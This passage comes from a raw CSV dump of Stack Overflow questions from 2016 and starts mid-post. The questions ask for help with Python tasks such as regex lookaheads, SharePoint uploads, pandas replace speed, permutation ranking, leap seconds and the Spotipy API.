<p>I said it doesn't work in Python because I tried this, expecting the exact same result, but instead I get only the first group:</p>

<pre><code>&gt;&gt;&gt; import re
&gt;&gt;&gt; re.search('-(\w.*?)(?=-)', '-a-bc-def-ghij-').groups()
('a',)
</code></pre>

<p>I tried with negative look ahead, but I couldn't find a working solution for this case.</p>
"
39755171,4140027.0,2016-09-28 18:33:46+00:00,4,How to insert string to each token of a list of strings?,"<p>Lets assume I have the following list:</p>

<pre><code>l = ['the quick fox', 'the', 'the quick']
</code></pre>

<p>I would like to transform each element of the list into a url as follows:</p>

<pre><code>['&lt;a href=""http://url.com/the""&gt;the&lt;/a&gt;', '&lt;a href=""http://url.com/quick""&gt;quick&lt;/a&gt;','&lt;a href=""http://url.com/fox""&gt;fox&lt;/a&gt;', '&lt;a href=""http://url.com/the""&gt;the&lt;/a&gt;','&lt;a href=""http://url.com/the""&gt;the&lt;/a&gt;', '&lt;a href=""http://url.com/quick""&gt;quick&lt;/a&gt;']
</code></pre>

<p>So far, I tried the following:</p>

<pre><code>list_words = ['&lt;a href=""http://url.com/{}""&gt;{}&lt;/a&gt;'.format(a, a) for a in x[0].split(' ')]
</code></pre>

<p>The problem is that the above list-comprehension just does the work for the first element of the list:</p>

<pre><code>['&lt;a href=""http://url.com/the""&gt;the&lt;/a&gt;',
 '&lt;a href=""http://url.com/quick""&gt;quick&lt;/a&gt;',
 '&lt;a href=""http://url.com/fox""&gt;fox&lt;/a&gt;']
</code></pre>

<p>I also tried with a <code>map</code> but, it didn't work:</p>

<pre><code>[map('&lt;a href=""http://url.com/{}""&gt;{}&lt;/a&gt;'.format(a,a),x) for a in x[0].split(', ')]
</code></pre>

<p>Any idea of how to create such links from the tokens of a list of sentences?</p>
"
39981210,3160869.0,2016-10-11 15:39:00+00:00,4,Upload file to MS SharePoint using Python OneDrive SDK,"<p>Is it possible to upload a file to the <strong>Shared Documents</strong> library of a <strong>Microsoft SharePoint</strong> site with the <strong><a href=""https://github.com/OneDrive/onedrive-sdk-python"" rel=""nofollow"">Python OneDrive SDK</a></strong>? </p>

<p><strong><a href=""https://dev.onedrive.com/readme.htm"" rel=""nofollow"">This documentation</a></strong> says it should be (in the first sentence), but I can't make it work.</p>

<p>I'm able to authenticate (with Azure AD) and upload to a <strong>OneDrive</strong> folder, but when trying to upload to a <strong>SharePoint</strong> folder, I keep getting this error:</p>

<blockquote>
  <p>""Exception of type 'Microsoft.IdentityModel.Tokens.<strong>AudienceUriValidationFailedException</strong>' was thrown.""</p>
</blockquote>

<p>The code I'm using that returns an object with the error:</p>

<pre><code>(...authentication...)
client = onedrivesdk.OneDriveClient('https://{tenant}.sharepoint.com/{site}/_api/v2.0/', auth, http)
client.item(path='/drive/special/documents').children['test.xlsx'].upload('test.xlsx')
</code></pre>

<p><a href=""http://i.stack.imgur.com/ZQEj4.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/ZQEj4.png"" alt=""where I&#39;d like to upload on the web""></a></p>

<p>I can successfully upload to <code>https://{tenant}-my.sharepoint.com/_api/v2.0/</code> (notice the ""<strong>-my</strong>"" after the <code>{tenant}</code>) with the following code:</p>

<pre><code>client = onedrivesdk.OneDriveClient('https://{tenant}-my.sharepoint.com/_api/v2.0/', auth, http)
returned_item = client.item(drive='me', id='root').children['test.xlsx'].upload('test.xlsx')
</code></pre>

<p>How could I upload the same file to a <strong>SharePoint</strong> site?</p>

<p><em>(Answers to similar questions (<a href=""http://stackoverflow.com/questions/37451835/onedrive-api-refer-to-sharepoint-file-to-upload-or-download-invalid-audience"">1</a>,<a href=""http://stackoverflow.com/questions/37233669/onedrive-api-python-sdk-points-to-login-live-com-not-mydomain-sharepoint-com"">2</a>,<a href=""http://stackoverflow.com/questions/29635758/onedrive-sharepoint-oauth-invalid-audience-error"">3</a>,<a href=""http://stackoverflow.com/questions/39822092/which-sdk-or-api-should-i-use-to-list-and-upload-files-into-office-365-sharepoin"">4</a>) on Stack Overflow are either too vague or suggest using a different API. My question is if it's possible using the OneDrive Python SDK, and if so, how to do it.)</em></p>

<hr>

<p><strong>Update</strong>: Here is my full code and output. (<em>Sensitive original data replaced with similarly formatted gibberish.</em>)</p>

<pre><code>import re
import onedrivesdk
from onedrivesdk.helpers.resource_discovery import ResourceDiscoveryRequest

# our domain (not the original)
redirect_uri = 'https://example.ourdomain.net/' 
# our client id (not the original)
client_id = ""a1234567-1ab2-1234-a123-ab1234abc123""  
# our client secret (not the original)
client_secret = 'ABCaDEFGbHcd0e1I2fghJijkL3mn4M5NO67P8Qopq+r=' 
resource = 'https://api.office.com/discovery/'
auth_server_url = 'https://login.microsoftonline.com/common/oauth2/authorize'
auth_token_url = 'https://login.microsoftonline.com/common/oauth2/token'
http = onedrivesdk.HttpProvider()
auth = onedrivesdk.AuthProvider(http_provider=http, client_id=client_id, 
                                auth_server_url=auth_server_url, 
                                auth_token_url=auth_token_url)

should_authenticate_via_browser = False
try:
    # Look for a saved session. If not found, we'll have to 
    # authenticate by opening the browser.
    auth.load_session()
    auth.refresh_token()
except FileNotFoundError as e:
    should_authenticate_via_browser = True
    pass

if should_authenticate_via_browser:
    auth_url = auth.get_auth_url(redirect_uri)
    code = ''
    while not re.match(r'[a-zA-Z0-9_-]+', code):
        # Ask for the code
        print('Paste this URL into your browser, approve the app\'s access.')
        print('Copy the resulting URL and paste it below.')
        print(auth_url)
        code = input('Paste code here: ')
        # Parse code from URL if necessary
        if re.match(r'.*?code=([a-zA-Z0-9_-]+).*', code):
            code = re.sub(r'.*?code=([a-zA-Z0-9_-]*).*', r'\1', code)
    auth.authenticate(code, redirect_uri, client_secret, resource=resource)
    # If you have access to more than one service, you'll need to decide
    # which ServiceInfo to use instead of just using the first one, as below.
    service_info = ResourceDiscoveryRequest().get_service_info(auth.access_token)[0]
    auth.redeem_refresh_token(service_info.service_resource_id)
    auth.save_session()  # Save session into a local file.

# Doesn't work
client = onedrivesdk.OneDriveClient(
    'https://{tenant}.sharepoint.com/sites/{site}/_api/v2.0/', auth, http)
returned_item = client.item(path='/drive/special/documents')
                      .children['test.xlsx']
                      .upload('test.xlsx')
print(returned_item._prop_dict['error_description'])

# Works, uploads to OneDrive instead of SharePoint site
client2 = onedrivesdk.OneDriveClient(
    'https://{tenant}-my.sharepoint.com/_api/v2.0/', auth, http)
returned_item2 = client2.item(drive='me', id='root')
                        .children['test.xlsx']
                        .upload('test.xlsx')
print(returned_item2.web_url)
</code></pre>

<p>Output:</p>

<pre><code>Exception of type 'Microsoft.IdentityModel.Tokens.AudienceUriValidationFailedException' was thrown.
https://{tenant}-my.sharepoint.com/personal/user_domain_net/_layouts/15/WopiFrame.aspx?sourcedoc=%1ABCDE2345-67F8-9012-3G45-6H78IJKL9M01%2N&amp;file=test.xlsx&amp;action=default
</code></pre>
"
40051299,3121975.0,2016-10-14 20:12:54+00:00,4,Python's check_output method doesn't return output sometimes,"<p>I have a Python script which is supposed to run a large number of other scripts, each located within a subdirectory of the script's working directory. Each of these other scripts is supposed to connect to a game client and run an AI for that game. To make this run, I had to run each script over two separate threads (one for each player). The problem I'm having is that sometimes the scripts' output isn't captured. My run-code looks like this:</p>

<pre><code>def run(command, name, count):
    chdir(name)
    output = check_output("" "".join(command), stderr = STDOUT, shell = True).split('\r')
    chdir('..')
    with open(""results_"" + str(count) + "".txt"", ""w"") as f:
        for line in output:
            f.write(line)
</code></pre>

<p>The strange part is that it does manage to capture longer streams, but the short ones go unnoticed. How can I change my code to fix this problem?</p>

<p><strong>UPDATE:</strong> I don't think it's a buffering issue because <code>check_output(""ls .."", shell = True).split('\n')[:-1]</code> returns the expected result and that command should take much less time than the scripts I'm trying to run.</p>

<p><strong>UPDATE 2:</strong> I have discovered that output is being cut for the longer runs. It turns out that the end of output is being missed for all processes that I run for some reason. This also explains why the shorter runs don't produce any output at all.</p>
"
39710796,6612853.0,2016-09-26 19:25:17+00:00,4,Infer the length of a sequence using the CIGAR,"<p>To give you a bit of context: I am trying to convert a sam file to bam</p>

<pre><code>samtools view -bT reference.fasta sequences.sam &gt; sequences.bam
</code></pre>

<p>which exits with the following error</p>

<pre><code>[E::sam_parse1] CIGAR and query sequence are of different length
[W::sam_read1] parse error at line 102
[main_samview] truncated file
</code></pre>

<p>and the offending line looks like this:</p>

<pre><code>SRR808297.2571281       99      gi|309056|gb|L20934.1|MSQMTCG   747     80      101M    =       790     142     TTGGTATAAAATTTAATAATCCCTTATTAATTAATAAACTTCGGCTTCCTATTCGTTCATAAGAAATATTAGCTAAACAAAATAAACCAGAAGAACAT      @@CFDDFD?HFDHIGEGGIEEJIIJJIIJIGIDGIGDCHJJCHIGIJIJIIJJGIGHIGICHIICGAHDGEGGGGACGHHGEEEFDC@=?CACC&gt;CCC      NM:i:2  MD:Z:98A1A
</code></pre>

<p>My sequence is 98 characters long but a probable bug when creating the sam file reported 101 in the CIGAR. I can give myself the luxury to loss a couple of reads and I don't have access at the moment to the source code that produced the sam files, so no opportunity to hunt down the bug and re-run the alignment. In other words, I need a pragmatic solution to move on (for now). Therefore, I devised a python script that counts the length of my string of nucleotides, compares it with what is registered in the CIGAR, and saves the ""sane"" lines in a new file.</p>

<pre><code>#!/usr/bin/python
import itertools
import cigar

with open('myfile.sam', 'r') as f:
    for line in itertools.islice(f,3,None): #Loop through the file and skip the first three lines
            cigar=line.split(""\t"")[5]
            cigarlength = len(Cigar(cigar)) #Use module Cigar to obtain the length reported in the CIGAR string
            seqlength = len(line.split(""\t"")[9])

            if (cigarlength == seqlength):
                    ...Preserve the line in a new file...
</code></pre>

<p>As you can see, to translate the CIGAR into an integer showing the length, I am using the module <a href=""https://pypi.python.org/pypi/cigar/0.1"" rel=""nofollow"">CIGAR</a>. To be honest, I am a bit wary of its behavior. This module seems to miscalculate the length in very obvious cases. Is there another module or a more explicit strategy to translate the CIGAR into the length of the sequence?</p>

<p><strong>Sidenote:</strong> Interesting, to say the least, that this problem has been widely reported but no pragmatic solution can be found in the internet. See the links below:</p>

<pre><code>https://github.com/COMBINE-lab/RapMap/issues/9
http://seqanswers.com/forums/showthread.php?t=67253
http://seqanswers.com/forums/showthread.php?t=21120
https://groups.google.com/forum/#!msg/snap-user/FoDsGeNBDE0/nRFq-GhlAQAJ
</code></pre>
"
39605640,4718190.0,2016-09-21 00:19:21+00:00,4,How do I pull a recurring key from a JSON?,"<p>I'm new to python (and coding in general), I've gotten this far but I'm having trouble. I'm querying against a web service that returns a json file with information on every employee. I would like to pull just a couple of attributes for each employee, but I'm having some trouble.</p>

<p>I have this script so far:</p>

<pre><code>import json
import urllib2

req = urllib2.Request('http://server.company.com/api')
response = urllib2.urlopen(req)
the_page = response.read()

j = json.loads(the_page)

print j[1]['name']
</code></pre>

<p>The JSON that it returns looks like this...</p>

<pre><code>{
    ""name"": bill jones,
    ""address"": ""123 something st"",
    ""city"": ""somewhere"",
    ""state"": ""somestate"",
    ""zip"": ""12345"",
    ""phone_number"": ""800-555-1234"",
},
{
    ""name"": jane doe,
    ""address"": ""456 another ave"",
    ""city"": ""metropolis"",
    ""state"": ""ny"",
    ""zip"": ""10001"",
    ""phone_number"": ""555-555-5554"",
},
</code></pre>

<p>You can see that with the script I can return the name of employee in index 1. But I would like to have something more along the lines of: <code>print j[**0 through len(j)**]['name']</code> so it will print out the name (and preferably the phone number too) of every employee in the json list.</p>

<p>I'm fairly sure I'm approaching something wrong, but I need some feedback and direction.</p>
"
39630676,1160341.0,2016-09-22 05:07:10+00:00,4,A print function makes a multiprocessing program fail,"<p>In the following code, I'm trying to create a sandboxed master-worker system, in which changes to global variables in a worker don't reflect to other workers.</p>

<p>To achieve this, a new process is created each time a task is created, and to make the execution parallel, the creation of processes itself is managed by <code>ThreadPoolExecutor</code>.</p>

<pre><code>import time
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pipe, Process


def task(conn, arg):
  conn.send(arg * 2)


def isolate_fn(fn, arg):

  def wrapped():
    parent_conn, child_conn = Pipe()
    p = Process(target=fn, args=(child_conn, arg), daemon=True)
    try:
      p.start()
      r = parent_conn.recv()
    finally:
      p.join()
    return r

  return wrapped


def main():
  with ThreadPoolExecutor(max_workers=4) as executor:
    pair = []

    for i in range(0, 10):
      pair.append((i, executor.submit(isolate_fn(task, i))))

      # This function makes the program broken.
      # 
      print('foo')

    time.sleep(2)

    for arg, future in pair:
      if future.done():
        print('arg: {}, res: {}'.format(arg, future.result()))
      else:
        print('not finished: {}'.format(arg))

  print('finished')

main()
</code></pre>

<p>This program works fine, until I put the <code>print('foo')</code> function inside the loop.  If the function exists, some tasks remain unfinished, and what is worse, this program itself doesn't finish.</p>

<p>Results are not always the same, but the following is the typical output:</p>

<pre><code>foo
foo
foo
foo
foo
foo
foo
foo
foo
foo
arg: 0, res: 0
arg: 1, res: 2
arg: 2, res: 4
not finished: 3
not finished: 4
not finished: 5
not finished: 6
not finished: 7
not finished: 8
not finished: 9
</code></pre>

<p>Why is this program so fragile?</p>

<p>I use Python 3.4.5.</p>
"
39709147,6162307.0,2016-09-26 17:42:28+00:00,4,Dictionary manipulation,"<p>I have a dictionary of dictionaries which dialed down a notch or two looks like this:</p>

<pre><code>a = {114907: {114905: 1.4351310915,
              114908: 0.84635577943,
              114861: 61.490648372},
     113820: {113826: 8.6999361654,
              113819: 1.1412795216,
              111068: 1.1964946282,
              117066: 1.5595617822,
              113822: 1.1958951003},
     114908: {114906: 1.279878388,
              114907: 0.77568252572,
              114862: 2.5412545474}
     }
</code></pre>

<p>The operation I wanna perform is as follows:</p>

<p>For every key of a:</p>

<ul>
<li>If its value (the innermost dictionary, e.g., <code>{114905: 1.435.., 114908: 0.846.., 114861: 61.490..}</code>) contains keys that are present as keys on the outermost one as well (in this case <code>114908</code>), replace them with the <code>k, v</code> values from the latter and remove it entirely.</li>
<li>Finally, convert the outermost key to a tuple containing both the original key and the key that was popped from the innermost dict.</li>
</ul>

<p>The desired output would be this:</p>

<pre><code>b = {(114907, 114908): {114905: 1.4351310915,
                        114906: 1.279878388,
                        114862: 2.5412545474,
                        114861: 61.490648372},
     113820: {113826: 8.6999361654,
              113819: 1.1412795216,
              111068: 1.1964946282,
              117066: 1.5595617822,
              113822: 1.1958951003}
     }
</code></pre>

<p>I really hope you got what I am trying to achieve here because this is not even describable.</p>

<p>This is what I have so far but it fails in several points and I am deeply convinced that I am going down the wrong road. Eventually I will get there but it would be the most inefficient thing ever coded.</p>

<pre><code>from copy import deepcopy

temp = deepcopy(a)
for item in temp:
    for subitems, values in temp[item].items():
        if values &lt; 1.0:
            for k, v in temp[subitems].items():
                if k != item:
                    a[item][k] = v
#                   a[item].pop(subitems)
for i in a:
    print(i, a[i])
#114908 {114905: 1.4351310915, 114906: 1.279878388, 114907: 0.77568252572, 114861: 61.490648372, 114862: 2.5412545474}
#114907 {114905: 1.4351310915, 114906: 1.279878388, 114908: 0.84635577943, 114861: 61.490648372, 114862: 2.5412545474}
#113820 {113826: 8.6999361654, 113819: 1.1412795216, 111068: 1.1964946282, 117066: 1.5595617822, 113822: 1.1958951003}
</code></pre>

<p>Side question, why does <code>pop</code> in dictionaries return the <code>value</code> only and not the <code>key: value</code> pair?</p>

<p>EDIT</p>

<p>An important detail which might make the thing easier is that another way to look for what has to be modified are the inner dict values. If they are below 1.0 their keys are bound to be keys of the outer dict as well.</p>
"
39811963,5102289.0,2016-10-01 22:16:16+00:00,4,How to apply a backtracking algorithm?,"<p>I'm doing some excercises in Python course and one of them where I'm stuck is below:</p>

<pre><code>Given a digit sequence that represents a message where each uppercase letter 
is replaced with a number (A - 1, B - 2, ... , Z - 26) and space - 0. 
Find the number of the initial messages, from which that sequence 
could be obtained.

Example: 12345 - 3 (ABCDE, LCDE, AWDE)
         11 - 2 (AA, K)
</code></pre>

<p>The naive solution is easy and it is simple bruteforce algorithm:</p>

<pre><code>import string

def count_init_messages(sequence):
    def get_alpha(seq):
        nonlocal count

        if len(seq) == 0:
            count += 1
            return

        for i in range(1, len(seq) + 1):
            if seq[:i] not in alph_table:
                break
            else:
                get_alpha(seq[i:])

    alphabet = "" "" + string.ascii_uppercase
    # generate dictionary of possible digit combination
    alph_table = {str(n): alph for n, alph in zip(range(len(alphabet)), alphabet)}
    # counter for the right combination met
    count = 0
    get_alpha(sequence)

    return count

def main():
    sequence = input().rstrip()
    print(count_init_messages2(sequence))

if __name__ == ""__main__"":
    main()
</code></pre>

<p>But as the length of an input sequence might be as long as 100 characters and there might be lots of repetition I have met a time limits. For example, one of the sample input is <code>2222222222222222222222222222222222222222222222222222222222222222222222 (possible messages number is 308061521170129)</code>. As my implementation makes too many repetition it takes ages for processing such an input. I think of using the backtracking algorithm, but I haven't realised yet how to implement the memoization for the succesive results.</p>

<p>I'd be glad if it is possible to point me out to the right way how to break that task.</p>
"
39844967,199754.0,2016-10-04 05:48:04+00:00,4,Pandas slow on data frame replace,"<p>I have an Excel file (.xlsx) with about 800 rows and 128 columns with pretty dense data in the grid. There are about 9500 cells that I am trying to replace the cell values of using Pandas data frame:</p>

<pre><code>xlsx = pandas.ExcelFile(filename)
frame = xlsx.parse(xlsx.sheet_names[0])
media_frame = frame[media_headers] # just get the cols that need replacing

from_filenames = get_from_filenames() # returns ~9500 filenames to replace in DF
to_filenames = get_to_filenames()

media_frame = media_frame.replace(from_filenames, to_filenames)
frame.update(media_frame)
frame.to_excel(filename)
</code></pre>

<p>The <code>replace()</code> takes 60 seconds. Any way to speed this up? This is not huge data or task, I was expecting pandas to move much faster. FYI I tried doing the same processing with same file in CSV, but the time savings was minimal (about 50 seconds on the <code>replace()</code>)</p>
"
40016950,3868056.0,2016-10-13 09:18:24+00:00,4,Regular expression finding '\n',"<p>I'm in the process of making a program to pattern match phone numbers in text.</p>

<p>I'm loading this text:</p>

<pre><code>(01111-222222)fdf
01111222222
(01111)222222
01111 222222
01111.222222
</code></pre>

<p>Into a variable, and using ""findall"" it's returning this:</p>

<pre><code>('(01111-222222)', '(01111', '-', '222222)')
('\n011112', '', '\n', '011112')
('(01111)222222', '(01111)', '', '222222')
('01111 222222', '01111', ' ', '222222')
('01111.222222', '01111', '.', '222222')
</code></pre>

<p>This is my expression:</p>

<pre><code>ex = re.compile(r""""""(
    (\(?0\d{4}\)?)?       # Area code
    (\s*\-*\.*)?          # seperator
    (\(?\d{6}\)?)        # Local number
     )"""""", re.VERBOSE)
</code></pre>

<p>I don't understand why the '\n' is being caught. </p>

<p>If <code>*</code> in '<code>\\.*</code>' is substituted for by '<code>+</code>', the expression works as I want it. Or if I simply remove <code>*</code>(and being happy to find the two sets of numbers separated by only a single period), the expression works.</p>
"
40078532,5455941.0,2016-10-17 04:32:08+00:00,4,Python - Why are some test cases failing?,"<p>So I'm working through problems on hackerrank, I am a beginner in python.</p>

<p>The information about what I'm trying to dois found here: <a href=""https://www.hackerrank.com/challenges/compare-the-triplets?h_r=next-challenge&amp;h_v=zen"" rel=""nofollow"">https://www.hackerrank.com/challenges/compare-the-triplets?h_r=next-challenge&amp;h_v=zen</a></p>

<pre><code>a0,a1,a2 = input().strip().split(' ')
a0,a1,a2 = [int(a0),int(a1),int(a2)]
b0,b1,b2 = input().strip().split(' ')
b0,b1,b2 = [int(b0),int(b1),int(b2)]

a1 = 0
b1 = 0
lst1 = a0,a1,a2
lst2 = b0,b1,b2

for x, y in zip(lst1, lst2):
    if x &gt; y:
        a1 += 1

    if x &lt;y:
        b1 += 1

    else:
        pass

print(a1, b1)
</code></pre>

<p>So this works perfectly well.</p>

<p>However, in one of the test cases, the input is </p>

<pre><code>6 8 12
7 9 15
</code></pre>

<p>and output should be </p>

<pre><code>0 3
</code></pre>

<p><strong>However my code keeps failing it. Why is this so?</strong></p>
"
39755045,2789762.0,2016-09-28 18:27:12+00:00,4,Putting a list in the same order as another list,"<p>There's a bunch of questions that are phrased similarly, but I was unable to find one that actually mapped to my intended semantics.</p>

<p>There are two lists, <code>A</code> and <code>B</code>, and I want to rearrange <code>B</code> so that it is in the same relative order as <code>A</code> - the maximum element of <code>B</code> is in the same position as the current position of the maximum element of <code>A</code>, and the same for the minimum element, and so on.</p>

<p>Note that <code>A</code> is not sorted, nor do I want it to be.</p>

<p>As an example, if the following were input:</p>

<pre><code>a = [7, 14, 0, 9, 19, 9]
b = [45, 42, 0, 1, -1, 0]
</code></pre>

<p>I want the output to be <code>[0, 42, -1, 0, 45, 1]</code>.</p>

<p>Please note that the intended output is not <code>[0, 45, 1, 0, 42, -1]</code>, which is what it would be it you zipped the two and sorted by <code>A</code> and took the resulting elements of <code>B</code> (this is what all of the other questions I looked at wanted).</p>

<p>Here's my code:</p>

<pre><code>def get_swaps(x):
    out = []

    if len(x) &lt;= 1:
        return out

    y = x[:]
    n = -1

    while len(y) != 1:
        pos = y.index(max(y))
        y[pos] = y[-1]
        y.pop()
        out.append((pos, n))
        n -= 1

    return out

def apply_swaps_in_reverse(x, swaps):
    out = x[:]
    for swap in swaps[::-1]:
        orig, new = swap
        out[orig], out[new] = out[new], out[orig]
    return out

def reorder(a, b):
    return apply_swaps_in_reverse(sorted(b), get_swaps(a))
</code></pre>

<p>The approach is basically to construct a list of the swaps necessary to sort <code>A</code> via selection sort, sort <code>B</code>, and then apply those swaps in reverse. This works, but is pretty slow (and is fairly confusing, as well). Is there a better approach to this?</p>
"
39839119,6563592.0,2016-10-03 19:35:32+00:00,4,Rank of a Permutation,"<p>so there was a question I wasn't able to solve mainly because of computing power or lack thereof. Was wondering how to code this so that I can actually run it on my computer. The gist of the questions is:</p>

<p>Let's say you have a string <code>'xyz'</code>, and you want to find all unique permutations of this string. Then you sort them and find the index of <code>'xyz'</code> out of the unique permutations. Which seemed simple enough but then once you get a really long string, my computer gives up. What's the mathematical way around this which I'd assume would lead me to code that can actually run on my laptop.</p>

<pre><code>from itertools import permutations

def find_rank(n):
    perms = [''.join(p) for p in permutations(n)]
    perms = sorted(set(perms))
    loc = perms.index(n)
    return loc
</code></pre>

<p>But if I want to run this code on a string that's 100 letters long, it's just way too many for my computer to handle. </p>
"
39598724,,2016-09-20 15:56:14+00:00,4,Convert KNN train from Opencv 3 to 2,"<p>I am reading a tutorial for training KNN using Opencv. The code is written for Opencv 3 but I need to use it in Opencv 2. The original training is:</p>

<pre><code>cv2.ml.KNearest_create().train(npaFlattenedImages, cv2.ml.ROW_SAMPLE, npaClassifications)
</code></pre>

<p>I tried using this:</p>

<pre><code>cv2.KNearest().train(npaFlattenedImages, cv2.CV_ROW_SAMPLE, npaClassifications)
</code></pre>

<p>but the error is:</p>

<p><code>Unsupported index array data type (it should be 8uC1, 8sC1 or 32sC1) in function cvPreprocessIndexArray</code></p>

<p>The full code is here:
<a href=""https://github.com/MicrocontrollersAndMore/OpenCV_3_KNN_Character_Recognition_Python/blob/master/TrainAndTest.py"" rel=""nofollow"">https://github.com/MicrocontrollersAndMore/OpenCV_3_KNN_Character_Recognition_Python/blob/master/TrainAndTest.py</a></p>
"
40134811,5798899.0,2016-10-19 14:49:33+00:00,4,"Issues with try/except, attempting to convert strings to integers in pandas data frame where possible","<p>I made a function to clean up any HTML code/tags from strings in my dataframe. The function takes every value from the data frame, cleans it with the remove_html function, and returns a clean df. After converting the data frame to string values and cleaning it up I'm attempting to convert where possible the values in the data frame back to integers. I have tried try/except but don't get the result that I want. This is what I have at the moment:</p>

<pre><code>def clean_df(df):
    df = df.astype(str)
    list_of_columns = list(df.columns)
    for col in list_of_columns:
        column = []
        for row in list(df[col]):
            column.append(remove_html(row))
            try:
                return int(row)
            except ValueError:
                pass

        del df[col]

        df[col] = column

    return df
</code></pre>

<p>Without the try/except statements the function returns a clean df where the integers are strings. So its just the try/except statement that seems to be an issue. I've tried the try/except statements in multiple ways and none of them return a df. The current code for example returns an 'int' object.</p>
"
39813433,4698922.0,2016-10-02 02:57:29+00:00,4,Why are dictionaries faster than lists in Python?,"<pre><code>&gt;&gt;&gt; timeit.timeit('test.append(""test"")', setup='test = []')
0.09363977164165221
&gt;&gt;&gt; timeit.timeit('test[0] = (""test"")', setup='test = {}')
0.04957961010914147
</code></pre>

<p>I even tried again with a loop, and same thing:</p>

<pre><code>&gt;&gt;&gt; timeit.timeit('for i in range(10): test.append(i)', setup='test = []')
1.3737744340367612
&gt;&gt;&gt; timeit.timeit('for i in range(10): test[i] = i', setup='test = {}')
0.8633718070233272
</code></pre>

<p>Why is the list slower?</p>
"
39978529,6867490.0,2016-10-11 13:35:52+00:00,4,Python: list index out of range (Assigning a 2D list to another 2D list),"<p>I am processing a 2D list and want to store the processed 2D list in a new 2D list with same indexes. But, I am getting error ""list index out of range""</p>

<p>I have simplified my code to make it easy to understand:</p>

<pre><code>a = [
    ['a', 'b'],
    ['c', 'd']
]
print a

b = []
for i in range(len(a)):
    for j in range(len(a[i])):
        if a[0][0] == 'a':
            a[0][0] = 'b'
        else:
            b[i][j] = a[i][j] #list index out of range
</code></pre>

<p>Thanks</p>
"
39686553,1210060.0,2016-09-25 11:59:26+00:00,4,What does python return on the leap second,"<p>What does python <code>time</code> and <code>datetime</code> module return on the leap second?</p>

<p>What will I get when we are at <em>23:59:60.5</em> if I call:</p>

<ul>
<li><code>time.time()</code></li>
<li><code>datetime.datetime.utcnow()</code></li>
<li><code>datetime.datetime.now(pytz.utc)</code></li>
</ul>

<p>Also, any difference between py2.7 and py3?</p>

<hr>

<p>Why it is confusing (at least for me):</p>

<p>From the <a href=""https://docs.python.org/2/library/datetime.html"" rel=""nofollow"">datetime docs</a> I see:</p>

<blockquote>
  <p>Unlike the time module, the datetime module does not support leap seconds.</p>
</blockquote>

<p>On the <a href=""https://docs.python.org/2/library/time.html#module-time"" rel=""nofollow"">time docs</a> I see there is ""support"" for leap seconds when parsing with <code>strptime</code>. But there is no comment about <code>time.time()</code>.</p>

<p>I see that using <code>time</code> I get:</p>

<pre><code>&gt;&gt;&gt; time.mktime(time.strptime('2016-06-30T23:59:59', ""%Y-%m-%dT%H:%M:%S""))
1467327599.0
&gt;&gt;&gt; time.mktime(time.strptime('2016-06-30T23:59:60', ""%Y-%m-%dT%H:%M:%S""))
1467327600.0
&gt;&gt;&gt; time.mktime(time.strptime('2016-07-01T00:00:00', ""%Y-%m-%dT%H:%M:%S""))
1467327600.0
</code></pre>

<p>And <code>datetime</code> just blows up:</p>

<pre><code>&gt;&gt;&gt; dt.datetime.strptime('2016-06-30T23:59:60', ""%Y-%m-%dT%H:%M:%S"")
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &amp;lt;module&gt;
ValueError: second must be in 0..59
</code></pre>

<p>Then what will I get at that exact time (in the middle of the leap second)?</p>

<p>I have read about rubber times, clocks slowing down, repeating seconds, and all kind of crazy ideas, but what should I expect on python?</p>

<p>Note: In case you wonder if I don't have anything better to do that care about it, a leap second is approaching!!!!</p>
"
39959409,1673632.0,2016-10-10 13:25:49+00:00,4,Trying to find a quick way to get windows path,"<p>I'm new to python.
I know how to detect which os is installed but I'm trying to find a quick way to get the windows path rather then go a-z (c:\windows...x:\windows...).
Is there any quick way?</p>

<p>Edit:
Something like %systemroot% in windows (gives you full path).</p>
"
39688358,1654143.0,2016-09-25 15:05:04+00:00,4,Spotipy - list index out of range,"<p>Writing a Spotipy script to return album tracks from a given album I'm occasionally getting the error: </p>

<pre><code>    album_id = results[""albums""][""items""][0][""uri""]
IndexError: list index out of range
</code></pre>

<p>The error tends to happen for more popular artists looping over all of their albums. I'm guessing results list has either reached it's limit or it's getting out of sequence somehow. Either way I'm not sure how to fix it as I'm pretty sure I got the album_id line off the Spotipy website. Any ideas?</p>

<pre><code>#!/usr/bin/python
# -*- coding: utf-8 -*-

import spotipy

sp = spotipy.Spotify()
sp.trace = False


def get_artist_albums(artist):
  results = sp.search(q = ""artist:"" + artist, type = ""artist"")
  items = results[""artists""][""items""]
  artist = items[0]
  # print artist

  albums = []
  albumsTitles  = []
  results = sp.artist_albums(artist[""id""], album_type = ""album"")
  albums.extend(results[""items""])
  while results[""next""]:
    results = sp.next(results)
    albums.extend(results[""items""])
  seen = set() # to avoid dups
  albums.sort(key = lambda album:album[""name""].lower())

  for album in albums:
    albumTitle = album[""name""]
    if albumTitle not in seen:
      print(("" "" + albumTitle))
      seen.add(albumTitle)
      albumsTitles.append(albumTitle)

  # return albumsTitles
  return albumsTitles 

def get_albums_tracks(album):
  albumtracks = []

  results = sp.search(q = ""album:"" + album, type = ""album"")

  # get the first album uri
  album_id = results[""albums""][""items""][0][""uri""]

  # get album tracks
  tracks = sp.album_tracks(album_id)
  c = 1
  # print album
  for track in tracks[""items""]:
    # print ""#%s %s"" %(c, track[""name""])
    albumtracks.append(track[""name""])
    c +=1
  return albumtracks


# 3 album band - ok
phosgoreAlbums = get_artist_albums(""Phosgore"")
for item in phosgoreAlbums:
  print get_albums_tracks(item)
  print """"

# 6 album band - ok
# (well technically 2, but's let not get into that night now)
joyDivisionAlbums = get_artist_albums(""Joy Division"")
for item in joyDivisionAlbums:
  print get_albums_tracks(item)
  print """"

# 34 albums - falls over
cherAlbums = get_artist_albums(""Cher"")
for item in cherAlbums:
  print get_albums_tracks(item)
  print """"

# 38 album band - falls over
theCureAlbums = get_artist_albums(""The Cure"")
for item in theCureAlbums:
  print get_albums_tracks(item)
  print """"

# 43 album band - falls over
aliceCooperAlbums = get_artist_albums(""Alice Cooper"")
for item in aliceCooperAlbums:
  print get_albums_tracks(item)
  print """"
</code></pre>
"
39815695,6900888.0,2016-10-02 09:38:00+00:00,4,How else part work in continue statement?,"<p>I'm not sure how the <code>continue</code> statement is interpreted when it is inside a <code>for</code> loop with an <code>else</code> clause.</p>

<p>If the condition is true, the <code>break</code> will exit from a <code>for</code> loop and <code>else</code> part will not be executed. And if the condition is False then <code>else</code> part will be executed. </p>

